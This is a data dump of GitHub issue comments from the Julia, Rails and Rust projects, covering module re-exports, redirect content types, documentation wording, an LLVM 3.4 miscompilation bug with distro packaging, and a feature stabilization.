julia/JuliaLang/1986/22273887,"seems weird to me (and if you are willing to add a  keyword, why not ?), but  seems fine to me if a bit subtle. I don't understand your concern about discovery of exported names; could you clarify? ",,False,False,1986
julia/JuliaLang/1986/22274563,"Currently, it easy to parse any julia file, search for  at the start of an expression, and interpret the comma-separated list that follows to quickly identify the public interface for a module. ♠using ... as ... with reexportusing`, not a new keyword ",,False,False,1986
julia/JuliaLang/1986/22276324,"I see, you are worried about manually parsing for exports.  It's not too bad with , though—you just need to do the same thing recursively for each . If you are wedded to , I would tend to just support . ",,False,False,1986
julia/JuliaLang/1986/22277284,"I'm just tossing around other proposals for consideration. Very likely, none of them are inherently better. I didn't mean to imply the  part was required.  or  or  would all be valid. Whether this is a single word or a phrase depends on whether we want to be closer to a english sentence or a keyword. I could accept either. ",,False,False,1986
julia/JuliaLang/1986/22279822,I personally kind of like .  It's got a nice symmetry with . ,,False,False,1986
julia/JuliaLang/1986/33334615,I made a macro that mostly works for this pupose. I say mostly because relative module syntax does not work. The parser parses  as  and throws a syntax error on . ,,False,False,1986
julia/JuliaLang/1986/33343580,"If we ever get a resolution of this issue, we would be able to remove hundreds of lines' worth of redundant-seeming exports from Base.LinAlg and then again from Base. ",,False,False,1986
julia/JuliaLang/1986/33758306,"I'm with @friend, in that I find  most appealing. What's the downside to adding that as a keyword? ",,False,False,1986
julia/JuliaLang/1986/33758686,"What does  do if you haven't imported/used anything from A, e.g. Exporting bindings that are not accessible in  is not really an option, so does it throw, export only the  module and none of its exported symbols, or implicitly call  or ? Unless it does something implicitly, it is even more verbose than the alternatives, since you need two lines of code instead of one. And if it does something implicitly, then we are adding a fourth keyword that imports bindings. ",,False,False,1986
julia/JuliaLang/1986/33758835,"Throw an error.  Even though it's more verbose, I find it clearer and more natural than most of the proposed alternatives. ",,False,False,1986
julia/JuliaLang/1986/33760909,"If  is going to throw if the module isn't already imported/used, it may as well be a macro? Since all imported/used modules will be in the module's scope by virtue of , it's not clear to me it needs to support relative module paths, which is the only thing a macro couldn't do. ",,False,False,1986
julia/JuliaLang/1986/33763993,"Whats the advantage of being a macro? It would be totally inconsistent if we have , , , ",,False,False,1986
julia/JuliaLang/1986/33765869,"Minimalism? It would be one fewer reserved identifier, one fewer Expr head, and in Julia instead of C. It is already a little awkward if it joins  and  as (I think) the third keyword that throws an error if another keyword has not been used before it. I kind of see the symmetry, but it doesn't seem quite right to me You can add bindings from another module to the current module and you can export bindings in the current module from the current module, but you cannot export bindings in another module from the current module unless those bindings are already also present in the current module. Personally, I would still prefer one of the two options I've created PRs for. It seems to me that is less elegant and easier to screw up than But if everyone else wants  and is averse to the  symbol, I can try to make that happen. ",,False,False,1986
julia/JuliaLang/1986/33791438,"Well, minimalism is a point that is always a concern when thinking about adding a keyword. I think the more general question is whether the regular Julia user should be confronted with the usage of macros. I would say no. This is an advanced thing and should not be part of the regular workflow. exportall is from my perspective something that will be needed in the ""regular use"" Its quite common to structure modules (namspaces, ...) into two levels. ",,False,False,1986
julia/JuliaLang/1986/33791928,"@friend Yes, writing a macro might be an advanced thing that ordinary users should not need to worry about. However, I don't think using a macro is that advanced -- they don't even need to understand how a macro works behind the scene in order to use it. All what we need is to clearly document the macro's usage. For instance, @friend is a good example which everyone can easily understand and use. Also, a code author should be quite tech savvy when he is worrying about something like re-exporting names. ",,False,False,1986
julia/JuliaLang/1986/33792647,"@friend macros are great. But still they do ""magical"" code transformations that I think most users should not be confronted with.  is a good example. This is a thing for advanced usage not for regular usage. I think reexporting names will be not that uncommon in practice. The export mechanism is Julias way for information hiding. And having submodules in modules is common and should also be encouraged. ",,False,False,1986
julia/JuliaLang/1986/33795698,"A better example for ""macros all users should be comfortable with"" is . ",,False,False,1986
julia/JuliaLang/1986/33829098,Which I think should be replaced with a pure Julia implementation when we can. (I have one partially implemented.) ,,False,False,1986
julia/JuliaLang/1986/33831503,"is pure Julia. It's just a macro. While a function could be useful for rare cases where the format string could vary at runtime, I am not sure how a function could be as performant as the macro, since the macro generates code based on the format string at load time. We also have , which is a keyword in most other languages. ",,False,False,1986
julia/JuliaLang/1986/33834001,Probably  and  are the best examples of macros for which my statement that macros are only for advanced users does not hold. ,,False,False,1986
julia/JuliaLang/1986/33843040,Comment fail. Need to try again on a different device. ,,False,False,1986
julia/JuliaLang/1986/33844994,"Another approach to this is not to import and then re-export, but rather to make these modules somehow ""inherit"" from the other modules. I.e. something like this In particular, one could consider a ""bare module"" – currently created with the  keyword – to be a module which inherits from no modules. However, you don't want this to be the default since it's handy to  all operators and have all of Base's exports available via . This default behavior could be expressed as this parentless module Then the default module behavior would be this Thus, writing  would be equivalent to the current  and writing  by itself would just be shorthand for . ",,False,False,1986
julia/JuliaLang/1986/33846189,"@friend That proposal seems elegant, but I'm a little worried about the nested module case. I guess you'd have something like To make this work, we'd have to first load all nested modules, then import their bindings, and finally load the main module. I'm not sure how big of a change this would be. I'm also not sure one always wants to inherit unexported bindings from other modules. In the nested module case, there's no reason we'd need the unexported bindings in the main module, and some could conflict. ",,False,False,1986
julia/JuliaLang/1986/33846683,"I didn't really mean for unexported bindings to be inherited. But yes, that is what I said. ",,False,False,1986
julia/JuliaLang/1986/33846767,"Needs some more thought, but I think there's something clean here. ",,False,False,1986
julia/JuliaLang/1986/33869981,I like Stefans proposal if it plays nice with with submodules. ,,False,False,1986
julia/JuliaLang/1986/34456557,"@friend Any further thoughts? Thinking about this more, I am a little worried about creating another way to import bindings that is subtly different from , , and . This might confuse more than it clarifies. ",,False,False,1986
julia/JuliaLang/1986/34495713,"I recently read a Julia dev paraphrasing someone else, in saying that Julia takes a ""we're all consenting adults here"" attitude. I'd very much like to be able to consent to exporting all symbols (or having a module inherit the exports of a parent, following @friend's implementation idea). If I'm writing library A, I'd like to be able to divide its concerns up into submodules of X and Y. In this way someone who only needed, say, the ""Network"" portion could employ , but most users would be opting for . There isn't any more implicit namespace pollution involved here than in the  call itself; the module inheritence would still only be acting on explicitly defined exports from modules X and Y, but I would no longer need to export every new function added to either submodule twice. (And with further nesting comes further code duplication.) I love the module implementation and its decoupling from the files themselves, it makes structuring a project (and later refactoring) that much easier. But without being able to shuttle around the symbols I'm exporting from submodule to parent, maintaining that clean organization becomes a constant thorn in the side, as you micro-manage your exports from one level to the next. It would be of further use in reducing code duplication when you have a group of conceptually related packages or modules that are always imported together. For a concrete example, there's the OpenGL library. You have the actual API versioned symbols you require, as well as the GLU library, and your own wrappers and convenience functions. For every submodule you write, you're importing three separate modules that will always be imported together in your code, instead of being able to do something like Sorry for the lack of brevity, but I wanted to share some use cases. I'm a new Julia user coming mostly from python, and I've been bitten by this problem multiple times over the last few days. ",,False,False,1986
julia/JuliaLang/1986/54951838,"Has there been any further progress, decision or discussion on this matter? Is @friend 's  package the agreed standard way to re-export the symbols of another package, i.e. should I use it? ",,False,False,1986
julia/JuliaLang/1986/54979840,"Since I haven't seen any other options emerge, I think Reexport is the de facto standard. ",,False,False,1986
julia/JuliaLang/1986/54980856,Thanks @friend ) I will be relying on it and will keep an eye on this thread. ,,False,False,1986
julia/JuliaLang/1986/67957609,It would be really great if we could have this functionality in Base. It would be great to have metapackages that simply group several packages together in order to provide a larger set of functionality. ,,False,False,1986
julia/JuliaLang/1986/268856694,Needs some design thoughts to figure out how we want this to work and interact with  /  /  / etc. ,,False,False,1986
julia/JuliaLang/1986/270719057,Crossref #14472 ,,False,False,1986
julia/JuliaLang/1986/315179573,I put together a macro implementation of something like this for one of my PRs as a demo ,,False,False,1986
julia/JuliaLang/1986/318467060,"Seems feature-y. There might be syntax we could want, but we if that does happen we can live with  a macro until 2.0. ",,False,False,1986
julia/JuliaLang/1986/340823505,Re-export is evil. ,,False,False,1986
julia/JuliaLang/1986/383327028,"I disagree that Reexport is evil. In writing a package with many levels of submodules, I find Reexport very convenient for managing namespaces across levels without lots of boilerplate code and code duplication. I echo the sentiment expressed above that this would be great functionality to have in Base. ",,False,False,1986
rails/rails/17194/45054611,"The  helper is hard-coded to return an html body with a Content-Type of . This can raise issues in some HTTP libraries when trying to follow non-html redirects if they try to parse the body, based on the initial request format, before following the redirect. While this isn't exactly a bug on rails's part, I think it is unexpected behavior and merits discussion on if/how it should change. The solution that makes the most sense to me would be always maintaining the content type of the instigating request and trying to come up with a sane default response for common ones, falling back to  for unrecognized ones so nobody's parsers choke on it. ",,False,False,17194
rails/rails/17194/60374005,"Do you have some specific examples of an HTTP library that it causes an issue with? I'm thinking about the spec for 307 redirects Unless the request method was HEAD, the entity of the response SHOULD contain a short hypertext note with a hyperlink to the new URI(s) , since many pre-HTTP/1.1 user agents do not understand the 307 status.  The same is true for 301 and 302. So I'd suspect the content type is correct, and this should remain as is. Although we should check it handles the HTTP HEAD case correctly. ",,False,False,17194
rails/rails/17194/60384869,@friend since you can write your own custom redirect proc I don't think it's worth addressing this within the  helper unless you can come up with a situation where this is a problem. If you can supply some further information that raises the importance of this issue we'll take another look at it. ,,False,False,17194
rails/rails/17194/151672721,"Ah, this just bit me again. The http library is , with . The middleware attempts to parse the redirect's body with the issued Content-Type before following the Location header. Using Faraday with FollowRedirects breaks on Rails generated redirects, both from  in controllers and  in routes. ",,False,False,17194
rails/rails/17194/151678151,"A proof-of-concept fork can be found here. If vetted, I'd be happy to submit it as a PR with tests, with a little direction on where I ought to put the shared code. ActionDispatch is a bit of an uncharted territory to me, and I'm not sure how it independent of ActionController it ought to be, or vice-versa. I ended up placing the method in ActionController simply because I noticed  already loaded , so why not  as well? ",,False,False,17194
rails/rails/17194/152240147,@friend that still sounds like bug in Faraday - is it blowing up because it's trying to parse the response as  even though it's returned as  ? ,,False,False,17194
rails/rails/17194/153087843,"Yep, it's making parsing assumptions based on the requested Content-Type, not the returned intermediary one. As mentioned– While this is definitely a Faraday bug, there's a case to be made for Rails to try to honor the requested Content-Type in its auto-genned responses, given that's the only actionable format information available to it at the time. ",,False,False,17194
rails/rails/17194/153088585,"My thoughts are mostly that this might be a nice-to-have feature with the API-friendly attitude Rails is adopting these days, rather than a bug report. Since it's something I've ran into more than once, thought I'd take its heartbeat again. ",,False,False,17194
rails/rails/17194/153094226,"Ugh, sorry–some of the places I've used  I meant . Got confused jumping back and forth from the client's perspective. I think getting my header nomenclature right illustrates why this feels unexpected if we asked for , and Rails isn't returning with , then it should be responding with the  we told it we would accept. Technically this isn't in spec for the  family, but it seems intuitive. ",,False,False,17194
rails/rails/17194/153104487,@friend I'd need to see another example of where it's a problem other than a Faraday bug before I could get behind changing it - don't want to support something going forward that isn't really necessary. ,,False,False,17194
rust/rust-lang/21568/55338233,"In the Compound Data Types chapter of the book, the term ""arity"" is used without any prior definition I've learned enough formal logic and programming language theory to know what ""arity"" means, but I suspect most programmers don't. (Neither does my spell checker!) And the book otherwise seems to be trying to use clear language and be readable by non-experts. I suggest changing it to ",,False,False,21568
rust/rust-lang/21568/71279278,"Sounds great to me, feel free to submit a pull request )  Maybe with ""types"" instead of ""type"". ",,False,False,21568
rust/rust-lang/21568/71279924,Or ,,False,False,21568
rust/rust-lang/21568/71280756,I'd prefer just defining . it's a really useful word. ,,False,False,21568
rust/rust-lang/21568/71285981,"It's a useful word if you do a lot of functional programming or formal logic ;-), but the rest of the book is very informal and tries hard to make J. Random Scripter feel comfortable, so tossing in a $20 word seems out of place. Maybe ",,False,False,21568
rust/rust-lang/21568/71286974,"But the arity refers to just the number of entries, not their types. It's an incomplete description and so awkward to define in passing. ",,False,False,21568
rust/rust-lang/21568/71293679,"I don't think arity need be mentionned. Saying ""contain the same types"" seems sufficient. That already has to deal with (A, B) vs (B, A). Seems to me that also deals with (A, A) vs (A, A, A). ",,False,False,21568
rust/rust-lang/21568/71329687,"I had seen  in the docs to, and it simply pissed me off.  Why force me to use google and dictionary.com?  Please just explain things in plain english, the docs is not a place to show off how smart you are and how advanced your english is. ",,False,False,21568
rust/rust-lang/21568/71330156,"@friend it's not to show off fancy language, it's a computer science term. It's a good word for any programmer to know. ",,False,False,21568
rust/rust-lang/21568/71331585,"@friend sometimes plain english is simply better, these are docs are supposed to make it easy to learn rust.  The reader is not likely interested in a course on rarely used computer science terms.  Just have a look part of the definition of  on wikpedia.  Cartesian product? dyadic? valency? adicity and degree? This term  comes off as very elitist.  Save it for your own blog, not the docs. ""In logic, mathematics, and computer science, the arity Listeni/ˈærɨti/ of a function or operation is the number of arguments or operands the function or operation accepts. The arity of a relation (or predicate) is the dimension of the domain in the corresponding Cartesian product. (A function of arity n thus has arity nplus one considered as a relation.) The term springs from words like unary, binary, ternary, etc. Unary functions or predicates may be also called ""monadic""; similarly, binary functions may be called ""dyadic"". In mathematics arity may also be named rank,[1][2] but this word can have many other meanings in mathematics. In logic and philosophy, arity is also called adicity and degree.[3][4] In linguistics, arity is usually named valency.[5]"" ",,False,False,21568
rust/rust-lang/21568/71332345,plus one for keeping  somehow. It's well worth learning the word imho. ,,False,False,21568
rust/rust-lang/21568/71332960,"@friend This attitude is not going to serve you well in Rust.  It's not ""elitist"" to define precise terms for concepts that may be hard to express in ""plain english"". Of course one should define them in the text.  And in this case I don't think it's worth the trouble, because there are satisfactory explanations in ""plain english"" (see above).  So, I'm in agreement with you that the text needs to be changed.  But turning it into a rant about ""elites"" is just gross and unhelpful. The thing is... when people ignore your ideas while making fun of the words you use to express them, it really does breed a bitterness and elitism, and ultimately a sort of siege mentality that you'll see in a lot of functional programming communities.  It's not pretty, and I don't want Rust to go the same way, although I don't think it's particularly likely. So please let's leave the culture war out of it.  Technical writing is hard. There are always many tradeoffs.  Just because someone uses a word you don't know, doesn't mean they're maliciously trying to feel superior to you.  My unsolicited advice Embrace being around people who know things you don't. Then you can learn from them. I hope that the Rust community will always be a safe place for that. ",,False,False,21568
rust/rust-lang/21568/71585066,"Slight modification. I think signature is the right word. Even if signatures' definition is unclear, the example should make it's meaning understandable; something the arity lacked.  You can assign tuples onto each other if the signature matches ",,False,False,21568
rust/rust-lang/21568/76631306,@friend The PR that addresses this ticket has been merged. Should this issue be closed now? ,,False,False,21568
rust/rust-lang/21568/76632077,"Yes, thanks. ",,False,False,21568
julia/JuliaLang/6757/32839542,I see this failure when running tests in my RPM package in 64-bits on a Fedora build machine. This is with git master as of today. Funnily the test passes on my machine; is it because it's been fixed in the recent hours? ,,False,False,6757
julia/JuliaLang/6757/42277561,"Strange... Is the  file present and can be found from where the tests are running? Sorry, I don't have access to a Fedora machine, could you run the failing test from the REPL? ",,False,False,6757
julia/JuliaLang/6757/42281394,"@friend As I said, I'm not able to reproduce the bug on my machine, only on the Fedora build VM. Could you suggest a few commands I could add so that the needed debug info is printed when building the package? ",,False,False,6757
julia/JuliaLang/6757/42281911,"Sure. Start the REPL in the test folder f = joinpath(""perf"", ""kernel"", ""imdb-1.tsv"") isfile(f) dlm_data = readdlm(joinpath(""perf"", ""kernel"", ""imdb-1.tsv""), '\t') ♠` ",,False,False,6757
julia/JuliaLang/6757/42282123,"@friend I can't reproduce the bug at the REPL. It would be nice if you could think of a few things which could fail, so that I put a series of debugging statements in my RPM package, and get the logs after the build runs. I'll test that the file exists, but I can't see any reason why it could be missing, so I'd like to test a few other possibilities if you have ideas (each build takes some time to start). ",,False,False,6757
julia/JuliaLang/6757/42283084,"A complete traceback of the exception would help identify the source line where  occurred and then we can add more debug statements. So, if the file exists, just a  of that file would print the exception stack. ",,False,False,6757
julia/JuliaLang/6757/42296548,"OK, got it. I think this is related to the fact that I build the RPM package against LLVM 3.4. Unfortunately, that's the only available version in Fedora 20. I've eventually simplified the command to this And I'm able to reproduce this locally when using LLVM 3.4. Do you think it's worth trying to fix? Without support for this version I'm not sure I'll be able to package Julia for Fedora -- though I need to investigate this issue since in the long-term this may prove problematic. ",,False,False,6757
julia/JuliaLang/6757/42344560,I use llvm 3.4 on Mac and haven't seen this failure. ,,False,False,6757
julia/JuliaLang/6757/42470281,"That's weird. Going back to 3.3 (where possible, it's a little hackish on Fedora 20 now) clearly fixed the problem. ",,False,False,6757
julia/JuliaLang/6757/42748353,Any ideas about how I could debug the problem further? ,,False,False,6757
julia/JuliaLang/6757/42752784,Cool! -) ,,False,False,6757
julia/JuliaLang/6757/42807961,"I was able to replicate this on a ubuntu 13.10 machine as well. Also observed that in method , the values in tuple  mysteriously change sometime after the call to  at line 293 (). Adding debug statements in the method shifts the problem around. Looks like some corruption? ",,False,False,6757
julia/JuliaLang/6757/42809494,Was that in llvm 3.4 or 3.3? ,,False,False,6757
julia/JuliaLang/6757/42821709,Also happens in 3.5. ,,False,False,6757
julia/JuliaLang/6757/43122380,"Removing 0.3 milestone, as 0.3 uses LLVM 3.3 only. We can reprioritize if this turns out to happen with LLVM 3.3 as well. ",,False,False,6757
julia/JuliaLang/6757/43137328,"Yet it's going to prevent me from packaging 0.3 in Fedora. Not saying it should be a blocker, but it's still relatively annoying. ",,False,False,6757
julia/JuliaLang/6757/43138626,Is that because fedora will only support llvm 3.4? They really shouldn't do that. Different versions of llvm are in general quite incompatible. ,,False,False,6757
julia/JuliaLang/6757/43240595,"Yeah, that's something I'm going to discuss with them. LLVM maintainers recently updated to 3.4, and for now I seem to be forced to follow this change. ",,False,False,6757
julia/JuliaLang/6757/43242235,That is a bummer if we can't be in the next fedora release. ,,False,False,6757
julia/JuliaLang/6757/43331800,I've just asked LLVM Fedora maintainers about this problem ,,False,False,6757
julia/JuliaLang/6757/43430916,"If the fix does not require major work, it would be really nice if we can fix this issue for LLVM 3.4 for the 0.3 release. ",,False,False,6757
julia/JuliaLang/6757/43445566,"Yeah, that and all the other bugs we don't yet know about. ",,False,False,6757
julia/JuliaLang/6757/43445834,"I am sure there are others. Let's see what the Fedora LLVM maintainers say. Otherwise, IIUC, we could be in the fedora-updates repository. ",,False,False,6757
julia/JuliaLang/6757/43446920,"Yeah, there may well be other bugs hidden somewhere... At least tests should catch the most important ones. @friend fedora-updates is the normal place were new packages appear, and that's really not a problem to be there. The question is rather, can Julia be included at all? But we'll likely figure out a solution. ",,False,False,6757
julia/JuliaLang/6757/43465082,"Not sure how useful this is, but the cutoff point to get this error is around 15 lines. For example,  works, but  fails. (It's sort of context-dependent, as taking  fails at . so maybe total # characters). ",,False,False,6757
julia/JuliaLang/6757/43617166,"I see the same change of  that @friend sees, and it appears to happen between when  calls  and the catch block for the  thrown by . When I try to print  in the catch block, the  value is correct, but I get a segfault in  because one of the arguments has been nulled out. So it seems like we are clobbering the stack somewhere. ",,False,False,6757
julia/JuliaLang/6757/43746422,"Here is where  is changed. Manually resetting this address to 16 allows the read to complete without the . @friend any ideas? why would we be passing a tuple on the stack and then overwriting that space? calls jl_alloc_tuple 0x00007ffff45b6214 &lt;julia_dlm_fill;17354+532&gt;   ff d0   callq  *%rax    0x00007ffff45b6216 &lt;julia_dlm_fill;17354+534&gt;   48 89 c3    mov    %rax,%rbx    0x00007ffff45b6219 &lt;julia_dlm_fill;17354+537&gt;   48 89 9c 24 98 01 00 00 mov    %rbx,0x198(%rsp) fill the tuple 0x00007ffff45b6221 &lt;julia_dlm_fill;17354+545&gt;   0f 28 44 24 60  movaps 0x60(%rsp),%xmm0 =&gt; 0x00007ffff45b6226 &lt;julia_dlm_fill;17354+550&gt;   66 48 0f 7e c7  movq   %xmm0,%rdi ♠ ",,False,False,6757
julia/JuliaLang/6757/44283402,I'll have a look at this. Thanks for the through analysis so far. ,,False,False,6757
julia/JuliaLang/6757/44682535,"@friend Hi. For demonstration purposes I've built julia from your SPEC file on build.opensuse.org, which has Fedora 20 as build target, but Fedora there is as it was released, e.g. no fedora-updates. So it still has LLVM 3.3. Tests were passed successfully. See the link  see you cannot use these packages in up-to-date Fedora 20, but only with original, released image. These packages are for demonsration only. ",,False,False,6757
julia/JuliaLang/6757/44691125,"@friend Interesting. Actually, I can do the same using Fedora's Copr build service. As you said, the problem appears when trying to install the package, since LLVM 3.3 conflicts with the latest Mesa from fedora-updates. It would be interesting to try to adapt the various Fedora packages to SuSE. ",,False,False,6757
julia/JuliaLang/6757/44712990,"@friend Hm, how do you restrict a build job on Copr to use Fedora w/out updates? I see someone tried to build julia on openSUSE, if you search for a 'julia' on ",,False,False,6757
julia/JuliaLang/6757/44745204,"@friend Actually, I don't need to it seems that the 'fedora' repo is available from Copr, even if 'fedora-updates' is available too. Making the Julia package depend on LLVM 3.3 works. Regarding openSUSE packages, IIRC the existing Julia package bundles all dependencies, and to get included in the distribution one should package libraries separately as I did for Fedora. But we're really out of topic here, better move the discussion elsewhere. ",,False,False,6757
julia/JuliaLang/6757/45046605,"I see this can be reduced to just julia&gt; readdlm(IOBuffer(""a\na"")) ERROR BoundsError()  in setindex! at ./array.jl308  in colval at ./datafmt.jl324  in store_cell at ./datafmt.jl195  in dlm_fill at ./datafmt.jl303  in dlm_fill at ./datafmt.jl316  in readdlm_string at ./datafmt.jl276  in readdlm_auto#88 at ./datafmt.jl59  in readdlm#86 at ./datafmt.jl49  in readdlm#84 at ./datafmt.jl46 ",,False,False,6757
julia/JuliaLang/6757/45293718,"But this one works, with extra space at the beginning of string ",,False,False,6757
julia/JuliaLang/6757/45305541,Same issue with readcsv (one backend) ,,False,False,6757
julia/JuliaLang/6757/45450408,"FWIW, we're probably going to be able to use LLVM 3.3 in Fedora (even though this may take a bit longer). Doesn't mean this bug shouldn't be fixed, of course! ",,False,False,6757
julia/JuliaLang/6757/51305806,@friend do you had a chance to look into this? ,,False,False,6757
julia/JuliaLang/6757/51438527,"I looked at briefly, but never got to isolate it. It's on my todo list though (I wanted to work on it today, but got held up by #7868). I can confirm that this is an optimizer bug though, so the first thing I'll do tomorrow is disable passes and see what makes it work. ",,False,False,6757
julia/JuliaLang/6757/51689339,"Just to point a fix to this issue would help for the official Debian package. The next release of Debian will not feature LLVM 3.3, only 3.4 and 3.5 (the Debian maintainer of LLVM says that 3.3 is too old now and unmaintained). And the Debian freeze happens on early november, so Julia 0.4 will not be ready by then. So my only option is to ship Julia 0.3 with LLVM 3.4 or 3.5. ",,False,False,6757
julia/JuliaLang/6757/51689598,We can do a point release of Julia 0.3.x that uses LLVM 3.5. ,,False,False,6757
julia/JuliaLang/6757/51689641,"@friend That would be great. The Debian deadline is roughly end of October, but even if the point release happens after that, I could still backport patches that are on the 0.3 git branch. ",,False,False,6757
julia/JuliaLang/6757/51690101,"Also, the general attitude that distros have about LLVM is not reasonable or healthy. LLVM is not a normal library that you can just upgrade or downgrade willy nilly – it is core infrastructure for building compilers and programming languages – the exact version matters a lot. By contrast, every distro seems to let you choose among a dozen different Python versions. Yet no one is willing to support more than one arbitrarily chosen version of LLVM at a time. ",,False,False,6757
julia/JuliaLang/6757/51690308,"Yes, we will have to do a julia 0.3.x release built for LLVM 3.5 in order to support various distros. ",,False,False,6757
julia/JuliaLang/6757/51690409,Can still get GCC versions back to 4.4 in Debian and plenty of other distributions. Treating LLVM any differently makes zero sense. ,,False,False,6757
julia/JuliaLang/6757/51690508,"@friend For the particular case of Debian, there are several LLVM versions coexisting. Currently there are 3.3, 3.4, 3.5 and 3.6-svn in Debian unstable. But 3.3 is going to be removed soon, because it is considered too old and unmaintained. ",,False,False,6757
julia/JuliaLang/6757/51690549,"Yes, upstream has stopped maintaining it, is the main reason. In any case, there is very little we can do about these policies. I do wish that they would let us ship with our own copy of LLVM 3.3, which we can install in  instead of system directories. Not allowing that seems excessive. ",,False,False,6757
julia/JuliaLang/6757/51690639,"I think @friend recently started doing exactly that in his PPA - since we only statically link to LLVM and don't install any of its headers, the only downside to doing it that way is compile time. ",,False,False,6757
julia/JuliaLang/6757/51690762,"@friend If I were shipping a private copy of LLVM 3.3, I would still have to maintain it for the lifetime of Debian Jessie, which means for the next two years. At least I would have to track security issues. Given that it's already unmaintained upstream, it is an unnecessary burden which nobody is willing to take in Debian. ",,False,False,6757
julia/JuliaLang/6757/51692847,"What I have taken to doing in the Ubuntu case, is building our own LLVM, statically linking it with Julia, and calling it good.  Note that there are no LLVM products that are shipped with Julia in this case; everything is statically linked into , so there's no chance of it messing with other installations.  There is still the maintenance burden though. ",,False,False,6757
julia/JuliaLang/6757/51693878,"I completely understand you not wanting to maintain LLVM 3.3 for Debian, but declaring a version that is less than a year old completely dead is kind of strange. We may just have to declare that LLVM is part of the Julia source and not even pretend that linking against it as a shared library provided by the distro is going to work. ",,False,False,6757
julia/JuliaLang/6757/51694939,"@friend The decision that LLVM 3.3 is dead was taken by the LLVM developers, not by Debian. Embedding a copy of LLVM 3.3 in Julia will not solve the issue, at least for Debian, for reasons explained above. ",,False,False,6757
julia/JuliaLang/6757/51695268,"I understand that the constraints of a distro like Debian are different than yours. And at a personal level, I cannot do much about the decision to remove LLVM 3.3 (I tried to argue with the Debian maintainer), and I cannot embed a copy of LLVM 3.3 in the Julia package because this completely goes against the spirit of a distro and could create problems with other parties (such as the security team). My current plan is to ship Julia 0.3 with LLVM 3.5. But if this is something that you definitely don't want to see happen because it could give a bad image of Julia, then the only option left is to not have Julia in the next Debian release. This would be sad, but this is not the end of the world either. ",,False,False,6757
julia/JuliaLang/6757/51695824,"Having a buggy version of Julia in the distribution is probably better and easier to fix later than no version at all, though that's up to Stefan, Jeff, Viral etc to decide. Sounds like this maintenance policy question really needs to be raised on the LLVM list, as more and more downstream projects depend on and distributions need to include specific older versions, and this is starting to interact poorly with LLVM's fast break-everything development style (which has other benefits, but gets in the way here). I know Rust has their own set of problems wrt distributions and bootstrapping, but what happens when Rust hits 1.0 for example? They're probably going to need to support a fixed version of LLVM for a while. ",,False,False,6757
julia/JuliaLang/6757/51696086,"I wasn't under the impression that Debian liked to ship buggy versions of things, but apparently they prefer that to allowing us to link to, you know, our dependencies. We could stand to get a better sense of how well julia 0.3 works with LLVM 3.5. We know there is a failing test, but we should try commenting out that test and see if everything else passes at least. ",,False,False,6757
julia/JuliaLang/6757/51696213,"I'm currently discussing the same issue for Fedora. I may be allowed to use LLVM 3.3 for the next release, but it's not sure yet.  more out-of-tree compilers like Julia and Rust rely on LLVM, it seems they really should review their release policy. ",,False,False,6757
julia/JuliaLang/6757/51696595,"@friend On my 64-bit machine, I can confirm that  is the only failing test with LLVM 3.5. ",,False,False,6757
julia/JuliaLang/6757/51696734,That's nice. Keno and several others have been going above &amp; beyond to try to keep julia working with LLVM 3.5 reasonably well. ,,False,False,6757
julia/JuliaLang/6757/51698686,"3.5 has OldJIT still... we could switch that back on with 3.5, although that setup is untested - whereas several of us have been using mcjit regularly. On Aug 9, 2014 354 PM, ""Jeff Bezanson"" notifications@friend.com wrote ",,False,False,6757
julia/JuliaLang/6757/51701045,Has anybody tested the performance of the old jit vs mcjit? I remember having read that the old jit was faster. Is it really an issue to have a package that has a statically linked llvm3.3? How do we do it with libuv? Isn't our version patched so that we cannot use upstream? ,,False,False,6757
julia/JuliaLang/6757/51701770,I'll have another go at the readdlm thing next week. Hopefully I can figure it out in time for the 3.5 release. ,,False,False,6757
julia/JuliaLang/6757/51708647,"@friend Indeed libuv is included as an embedded copy in the Debian package. But first, this is supposed to be a temporary situation (see the JuliaLang/libuv#2). And second, libuv is a much smaller codebase than LLVM. Which means that it is much more manageable to maintain a forked embedded copy of libuv than one of LLVM. ",,False,False,6757
julia/JuliaLang/6757/52439248,I've started to run some experiments on which IR passes cause this in order to try to identify the IR pattern that gets miscompiled. First results Encouraging isn't it ;)? ,,False,False,6757
julia/JuliaLang/6757/52439803,Seems to be a problem with LLVM's Stack Slot coloring ,,False,False,6757
julia/JuliaLang/6757/52440002,"Specifically, stack slot sharing Feels like I'm getting closer ) ",,False,False,6757
julia/JuliaLang/6757/52442227,Here's a debug dump from the stack coloring pass The second one is with sharing disabled. As you can see the first one deletes two stack slots. Of course this isn't necessarily a problem with the stack coloring pass. It might also be a problem with the analysis pass that it uses. ,,False,False,6757
julia/JuliaLang/6757/52450909,"@friend Why were you thinking the tuple is passed on the stack. From looking at the generated code, the callee is expecting it in xmm. ",,False,False,6757
julia/JuliaLang/6757/52454765,"As far as I can tell, the stack coloring transformation is correct, so I wonder what's going on. ",,False,False,6757
julia/JuliaLang/6757/52536712,"Wow, nice sleuthing! (I missed your question last night...) limping through the disassembly, more or less. ",,False,False,6757
julia/JuliaLang/6757/52537590,"Also, for posterity and general enjoyment, here's the code I wrote to track this down ",,False,False,6757
julia/JuliaLang/6757/52540686,I see you use  as the extension for your C++ source files now ) The application of julia metaprogramming to C++ here is absolutely mind-boggling. ,,False,False,6757
julia/JuliaLang/6757/52541100,"Whoa. When you go bug-hunting, you carry some heavy weaponry! Poor things don't stand a chance. ",,False,False,6757
julia/JuliaLang/6757/52542191,"Yeah, I love the ",,False,False,6757
julia/JuliaLang/6757/52551260,"This is nuts. @friend, you've outdone yourself. ",,False,False,6757
rust/rust-lang/41022/218789015,"Tracks stabilization for accepting  as a fragment specifier in macros, gated by . Introduced in #41012. ",,False,False,41022
rust/rust-lang/41022/301950519,I tried in #40984 to parse a pattern like  but the visibility isn't enough to terminate the repetition. It's unclear if this is a systemic issue with  or if it can be worked around. ,,False,False,41022
rust/rust-lang/41022/338007000,Is this mature enough to be stabilized? ,,False,False,41022
rust/rust-lang/41022/338009629,45388 will be a minor breaking change to  consider . ,,False,False,41022
rust/rust-lang/41022/351260526,Shall we stabilize this? ,,False,False,41022
rust/rust-lang/41022/358159818,This feature was implemented and tested in  AFAICT there have been no issues or problems since then. @friend fcp merge ,,False,False,41022
rust/rust-lang/41022/358159824,"Team member @friend has proposed to merge this. The next step is review by the rest of the tagged teams  [ ] @friend [x] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend  No concerns currently listed. Once these reviewers reach consensus, this will enter its final comment period. If you spot a major issue that hasn't been raised at any point in this process, please speak up! See this document for info about what commands tagged team members can give me. ",,False,False,41022
rust/rust-lang/41022/358377655,I would like to see a comment pointing out the relevant tests so I can review the behavior. =) ,,False,False,41022
